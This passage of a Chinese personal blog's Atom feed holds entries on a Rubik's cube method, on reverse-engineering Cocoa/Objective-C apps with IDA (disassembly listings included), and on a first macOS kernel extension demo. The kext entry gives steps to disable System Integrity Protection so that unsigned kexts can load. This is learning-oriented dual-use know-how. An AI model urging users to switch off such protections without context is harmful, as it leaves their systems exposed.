&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;new ArrayList&amp;lt;String&amp;gt;()&amp;#123;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    add(&amp;quot;&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;java 代码中出现这种写法，好奇add 函数是调用哪里的？&lt;br&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>五阶魔方</title>
    <link href="http://yoursite.com/2017/03/18/%E4%BA%94%E9%98%B6%E9%AD%94%E6%96%B9/"/>
    <id>http://yoursite.com/2017/03/18/五阶魔方/</id>
    <published>2017-03-18T07:21:26.000Z</published>
    <updated>2017-03-20T05:21:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>魔方算是数学类的玩具，玩到最后就变成了肌肉+手势的简单操作。<br>我目前还没达到肌肉记忆的水平，所以要写篇文章记录一下。</p>
<a id="more"></a>
<p>5阶魔方步骤：</p>
<ul>
<li>6个面</li>
<li>12条棱</li>
<li>8个角</li>
</ul>
<h3 id="6个面"><a href="#6个面" class="headerlink" title="6个面"></a>6个面</h3><ul>
<li>去让回</li>
<li>使用最后2个面，采用1-2的方法</li>
</ul>
<h3 id="12条棱"><a href="#12条棱" class="headerlink" title="12条棱"></a>12条棱</h3><p>最后的情况只有2个”2+1”,或者3个”2+1”；并且2个”2+1”会变成3个”2+1”</p>
<p>一、先介绍 2个”2+1” –&gt; 3个”2+1”：</p>
<pre><code>-   TR U2做5次
</code></pre><p><a href="http://www.rubik.com.cn/alg/?type=alg&amp;alg=(Rw_U2)5_x2_B-_Rw_U-_R2_U_Rw-_&amp;scheme=custom&amp;puzzle=5x5x5&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<p>二、3个”2+1”：</p>
<p><img src="/include/img/life/棱3.png" alt=""><br><a href="http://www.rubik.com.cn/alg/?type=alg&amp;alg=R_U_R-_F_R-_F-_R&amp;scheme=custom&amp;puzzle=5x5x5&amp;setup=Uw_L-_U_L_Uw-&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<h4 id="技巧1-翻棱公式"><a href="#技巧1-翻棱公式" class="headerlink" title="技巧1. 翻棱公式"></a>技巧1. 翻棱公式</h4><p>遇上下面这种情况就 用翻棱公式。<br><img src="/include/img/life/翻棱公式.png" alt="TR2 B2 U2 TL U2 TR&#39; U2 TR U2 F2 TR F2 TL&#39; B2 TR2"></p>
<p><a href="http://www.rubik.com.cn/alg1/?type=alg&amp;alg=Rw2_B2_U2_Lw_U2_Rw-_U2_Rw_U2_F2_Rw_F2_Lw-_%0AB2_Rw2&amp;scheme=custom&amp;puzzle=5x5x5&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<h3 id="8个角"><a href="#8个角" class="headerlink" title="8个角"></a>8个角</h3><p>。。。<br>最后推荐一个 初学者学习的网站： <a href="http://www.rubik.com.cn/professor.htm" target="_blank" rel="external">魔方小站</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;魔方算是数学类的玩具，玩到最后就变成了肌肉+手势的简单操作。&lt;br&gt;我目前还没达到肌肉记忆的水平，所以要写篇文章记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
      <category term="魔方" scheme="http://yoursite.com/tags/%E9%AD%94%E6%96%B9/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析 cocoa App</title>
    <link href="http://yoursite.com/2017/03/16/%E6%95%99%E7%A8%8B/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-cocoa-App/"/>
    <id>http://yoursite.com/2017/03/16/教程/逆向分析-cocoa-App/</id>
    <published>2017-03-16T05:50:01.000Z</published>
    <updated>2017-04-28T02:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title:【技术分享】Cocoa应用逆向工程简介<br>Url: <a href="http://bobao.360.cn/learning/detail/3601.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3601.html</a></p>
<p>Core Skill:<br>逆向分析 Object-C APP基础。</p>
<ol>
<li>如何使用 IDA 逆向Object-C编译得到的 C 代码</li>
<li>Cocoa App 的代码入口点</li>
<li>分析界面<a id="more"></a>
</li>
</ol>
<p>FLARE团队将会介绍两款小工具</p>
<p>我们会解释Objective-C的Runtime特性如何使得代码分析在诸如IDA Pro工具中变得复杂</p>
<p>如何在一份Cocoa应用程序的代码中找到开始分析的入口点。</p>
<h3 id="Objective-C"><a href="#Objective-C" class="headerlink" title="Objective-C"></a>Objective-C</h3><p>在编译时，Objective-C编写的程序会被转化为C，<br>由于Objective-C的动态特性，method一般不是被直接调用的。而是通过一个发给对象的消息。一个method的名字称为一个selector，真正执行的函数被称为一个实现（implementation）。<br>在Objective-C应用中最常用的发送消息方式就是objc_msgSend函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> __objc2_meth &#123;</div><div class="line">    SEL NAME;       <span class="comment">// selector</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* types;  <span class="comment">//type encoding</span></div><div class="line">    IMP  imp;       <span class="comment">//implementation</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>该结构的第一个值是指向method的selector。该值的cross-references中的一项将我们带到了可执行文件__objc_selrefs 节，这个节中你可以找到selector reference。跟随该selector reference的cross-references我们可以在代码中找到任何selector被使用的位置。该结构的第三个值指向selector的实现，就是我们想要分析的函数。剩下要做的就是利用这个数据生成cross-references。</p>
<p>静态分析 OC 对应的汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__text:0000287E ; 32:   v9 = objc_msgSend(&amp;OBJC_CLASS___AppDelegate, &quot;class&quot;);</div><div class="line">__text:0000287E                 MOV             R0, #(selRef_class - 0x2892)</div><div class="line">__text:00002886                 MOV             R2, #(classRef_AppDelegate - 0x2894)</div><div class="line">__text:0000288E                 ADD             R0, PC ; selRef_class</div><div class="line">__text:00002890                 ADD             R2, PC ; classRef_AppDelegate</div><div class="line">__text:00002892                 LDR             R1, [R0] ; &quot;class&quot;    //select</div><div class="line">__text:00002894                 LDR             R0, [R2] ;</div><div class="line">__text:00002896                 BLX             _objc_msgSend</div><div class="line">_OBJC_CLASS_$_AppDelegate</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">__objc_selrefs:000057B8                 AREA __objc_selrefs, DATA</div><div class="line">__objc_selrefs:000057B8                 ; ORG 0x57B8</div><div class="line">__objc_selrefs:000057B8 selRef_class    DCD sel_class           ; DATA XREF: start+26o</div><div class="line">__objc_selrefs:000057B8                                         ; start+36o ...</div><div class="line">__objc_selrefs:000057B8                                         ; &quot;class&quot;</div><div class="line">__objc_selrefs:000057BC selRef_alloc    DCD sel_alloc           ; DATA XREF: -[AppDelegate application:didFinishLaunchingWithOptions:]+1Eo</div><div class="line">__objc_selrefs:000057BC                                         ; -[AppDelegate application:didFinishLaunchingWithOptions:]+36o ...</div><div class="line">__objc_selrefs:000057BC                                         ; &quot;alloc&quot;</div><div class="line">__objc_selrefs:000057C0 selRef_mainScreen DCD sel_mainScreen    ; DATA XREF: -[AppDelegate application:didFinishLaunchingWithOptions:]+70o</div><div class="line">__objc_selrefs:000057C0                                         ; -[AppDel</div></pre></td></tr></table></figure>
<p>从<strong>text 段跟踪到了objc_selrefs段。发现 在</strong>objc_selrefs 段中，key-value 名称的对应关系是 selRef_xxx - sel_xxx。</p>
<p>我们在 __objc_const 段中查看 select列表, 只有部分 select 名称中包含 sel 前缀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">__objc_const:00005098 _OBJC_INSTANCE_METHODS_NSObject __objc2_meth_list &lt;0xC, 0x13&gt;</div><div class="line">__objc_const:00005098                                         ; DATA XREF: __data:_OBJC_PROTOCOL_$_NSObjecto</div><div class="line">__objc_const:000050A0                 __objc2_meth &lt;aIsequal, aC12048, 0&gt; ; &quot;isEqual:&quot;</div><div class="line">__objc_const:000050AC                 __objc2_meth &lt;aHash, aI804, 0&gt; ; &quot;hash&quot;</div><div class="line">__objc_const:000050B8                 __objc2_meth &lt;aSuperclass, a804_0, 0&gt; ; &quot;superclass&quot;</div><div class="line">__objc_const:000050C4                 __objc2_meth &lt;sel_class, a804_0, 0&gt; ; &quot;class&quot;</div><div class="line">__objc_const:000050D0                 __objc2_meth &lt;aSelf, a804, 0&gt; ; &quot;self&quot;</div><div class="line">__objc_const:000050DC                 __objc2_meth &lt;aZone, a_nszone804, 0&gt; ; &quot;zone&quot;</div><div class="line">__objc_const:000050E8                 __objc2_meth &lt;aPerformselecto, a12048, 0&gt; ; &quot;performSelector:&quot;</div><div class="line">__objc_const:000050F4                 __objc2_meth &lt;aPerformselec_0, a1604812, 0&gt; ; &quot;performSelector:withObject:&quot;</div><div class="line">__objc_const:00005100                 __objc2_meth &lt;aPerformselec_1, a200481216_0, 0&gt; ; &quot;performSelector:withObject:withObject:&quot;</div><div class="line">__objc_const:0000510C                 __objc2_meth &lt;aIsproxy, aC804, 0&gt; ; &quot;isProxy&quot;</div><div class="line">__objc_const:00005118                 __objc2_meth &lt;aIskindofclass, aC12048_0, 0&gt; ; &quot;isKindOfClass:&quot;</div><div class="line">__objc_const:00005124                 __objc2_meth &lt;aIsmemberofclas, aC12048_0, 0&gt; ; &quot;isMemberOfClass:&quot;</div><div class="line">__objc_const:00005130                 __objc2_meth &lt;aConformstoprot, aC12048, 0&gt; ; &quot;conformsToProtocol:&quot;</div><div class="line">__objc_const:0000513C                 __objc2_meth &lt;sel_respondsToSelector_, aC12048_1, 0&gt; ; &quot;respondsToSelector:&quot;</div><div class="line">__objc_const:00005148                 __objc2_meth &lt;aRetain, a804, 0&gt; ; &quot;retain&quot;</div><div class="line">__objc_const:00005154                 __objc2_meth &lt;aRelease, aVv804, 0&gt; ; &quot;release&quot;</div><div class="line">__objc_const:00005160                 __objc2_meth &lt;aAutorelease, a804, 0&gt; ; &quot;autorelease&quot;</div><div class="line">__objc_const:0000516C                 __objc2_meth &lt;aRetaincount, aI804, 0&gt; ; &quot;retainCount&quot;</div><div class="line">__objc_const:00005178                 __objc2_meth &lt;aDescription, a804, 0&gt; ; &quot;description&quot;</div><div class="line">__objc_const:00005184 _OBJC_INSTANCE_METHODS_NSObject_1 __objc2_meth_list &lt;0xC, 1&gt;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>额，看不懂 Mach-O的各种段的含义，需要 正向开发 和分析 Mach-O文件格式了。。。<br><img src="/include/img/rev-ios.png" alt="rev-ios"></p>
</blockquote>
<p>继续。。。</p>
<p><a href="https://github.com/fireeye/flare-ida" target="_blank" rel="external">objc2_xrefs_helper.py</a> 脚本针对可执行文件中的每一个定义的Objective-C method都会进行处理<br>这个工具有一个显著的缺点，如果几个类使用同一个名字来定义method，那么只会有一个selector在可执行文件中显示。现在，该工具会忽略这些不明确的selector。</p>
<h3 id="Cocoa应用－从哪里开始着手？"><a href="#Cocoa应用－从哪里开始着手？" class="headerlink" title="Cocoa应用－从哪里开始着手？"></a>Cocoa应用－从哪里开始着手？</h3><p>整体来说，NSApplicationMain执行三个重要步骤：构建NSApplication对象，加载主要的storyboard或nib文件，开始事件循环。NSApplication对象在程序运行时扮演重要的事件和通知协调者的角色。</p>
<p>NSApplication对象可以定位的一个重要的通知就是NSApplicationDidFinishLaunchingNotification。这个通知用来让程序员可以在合适的时候运行应用特殊的初始化代码。为了处理这个通知，应用程序需要指定根据NSApplicationDelegate协议来指定一个委托类。在这个协议中包含初始化代码的对应method就是applicationDidFinishLaunching.Xcode默认为你创建这个委托类，名叫AppDelegate。</p>
<p>那么最好的寻找大多数Cocoa应用的初始化代码的地方就是applicationDidFinishLaunching</p>
<h3 id="接口构建器（Interface-Builder）和Nib文件"><a href="#接口构建器（Interface-Builder）和Nib文件" class="headerlink" title="接口构建器（Interface Builder）和Nib文件"></a>接口构建器（Interface Builder）和Nib文件</h3><p>界面生成器<br><a href="https://github.com/i-o-s/macOS-tools" target="_blank" rel="external">nib_parse.py</a>使用ccl_bplist来解码和反序列化一个nib文件，打印出里面定义的连接关系列表。对于每个连接，它将会打印出连接的标签（一般是一个方法或者变量名字），源对象的类，目标对象的类。每一个对象都被NSKeyedArchiver编码，并分配一个唯一的数字标识符，该标识符输出在圆括号里面。对于某些GUI组件还会一起打印出文本信息，比如按键标签，文本信息输出在方括号中。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title:【技术分享】Cocoa应用逆向工程简介&lt;br&gt;Url: &lt;a href=&quot;http://bobao.360.cn/learning/detail/3601.html&quot;&gt;http://bobao.360.cn/learning/detail/3601.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill:&lt;br&gt;逆向分析 Object-C APP基础。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如何使用 IDA 逆向Object-C编译得到的 C 代码&lt;/li&gt;
&lt;li&gt;Cocoa App 的代码入口点&lt;/li&gt;
&lt;li&gt;分析界面
    
    </summary>
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="public intelligence" scheme="http://yoursite.com/tags/public-intelligence/"/>
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
      <category term="cocoa app" scheme="http://yoursite.com/tags/cocoa-app/"/>
    
  </entry>
  
  <entry>
    <title>OSX FirstExtension 开发</title>
    <link href="http://yoursite.com/2017/03/16/%E5%BC%80%E5%8F%91/OSX-FirstExtension-%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2017/03/16/开发/OSX-FirstExtension-开发/</id>
    <published>2017-03-16T05:34:03.000Z</published>
    <updated>2017-04-28T02:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>第一个 OSX 上的 Kernel Extension demo</p>
<a id="more"></a>
<p>参考：<a href="http://www.jianshu.com/p/f76bdfbc6779" target="_blank" rel="external">iOS架构-内核开发</a></p>
<p>从10.11开始Apple 对Kext 的安装变得更为严格。<br>从kext安装历史来看，10.11 之前可以通过<br><code>sudo nvram kext-dev-mode=1 and reboot(重启电脑).</code><br>这种方式来加载 非开发者证书签名的 kext。</p>
<p>但是之后 只有2条路了（上面的方式相对 更不安全）：</p>
<ol>
<li>购买 Apple 开发者证书</li>
<li>完全关闭 SIP</li>
</ol>
<p>关闭 SIP的方法:</p>
<ol>
<li>重启电脑,重启过程中一直按着command + R 直到进入startup界面</li>
<li>打开Terminal输入csrutil disable</li>
<li>reboot</li>
</ol>
<h3 id="代码展示（项目创建就算了）"><a href="#代码展示（项目创建就算了）" class="headerlink" title="代码展示（项目创建就算了）"></a>代码展示（项目创建就算了）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libkern/libkern.h&gt;</span>  <span class="comment">//C++ 库函数</span></span></div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d);</div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d);</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FirstExtension is start!!!"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FirstExtension goto  stop!!!"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="开发测试："><a href="#开发测试：" class="headerlink" title="开发测试："></a>开发测试：</h3><p>在 10.12 上开发，然后拿到 10.11 关闭 SIP 的机器上测试。</p>
<p>编译安装 kext流程：</p>
<ul>
<li>uname -r 查看系統內核版本, 设置libkern版本</li>
<li>sudo chown -R root:wheel HelloWorld.kext 更改權限</li>
<li>sudo kextload HelloWorld.kext 加載內核擴展</li>
<li>kextstat 查看當前內核擴展情況</li>
<li>sudo kextunload HelloWorld.kext 卸載內核擴展</li>
</ul>
<p>注意 kext 的 info.plist 中<code>OSBundleLibraries -&gt;com.apple.kpi.libkern</code> 对应的版本号 是测试机上的 libkern 的版本(uname -a)</p>
<p><img src="/include/img/kext/xcode.png" alt="xcode"></p>
<p>使用 kextutil 工具检测 kext 存在的bug<br><img src="/include/img/kext/mini.png" alt="mini"></p>
<p>果然是关闭了 SIP 就可以 安装 kext, 已经显示 ‘allowing invalid signature xxx’<br><img src="/include/img/kext/kextstat.png" alt="kextstat"></p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>如何查看 kext 的输入（日志）？</p>
<p>Todo:</p>
<ol>
<li>git 项目 提取 kext</li>
<li>fuzz osx kernel — kext</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">初探Mac OSX内核开发(一)——创建内核扩展</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h3&gt;&lt;p&gt;第一个 OSX 上的 Kernel Extension demo&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
    
      <category term="kext" scheme="http://yoursite.com/tags/kext/"/>
    
      <category term="c" scheme="http://yoursite.com/tags/c/"/>
    
  </entry>
  
</feed>
